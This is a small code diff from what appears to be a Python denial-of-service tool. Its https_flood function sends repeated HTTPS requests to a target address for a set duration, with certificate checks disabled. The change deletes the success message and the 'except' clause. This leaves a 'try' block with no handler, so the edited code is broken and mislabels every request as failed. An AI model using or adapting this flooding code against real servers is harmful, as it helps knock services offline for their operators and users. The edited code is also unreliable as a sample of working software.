@@ -190,8 +190,6 @@ def https_flood(target_ip, target_port, duration):
     while time.time() < end_time:
         try:
             session.get(f"https://{target_ip}", headers=headers, verify=False, timeout=50)
-            print(f"{WHITE}[+] HTTPS Flood sent to {target_ip}:{target_port}{RESET}")
-        except:
             print(f"{RED}[-] HTTPS Flood failed{RESET}")
             time.sleep(0.1)
 
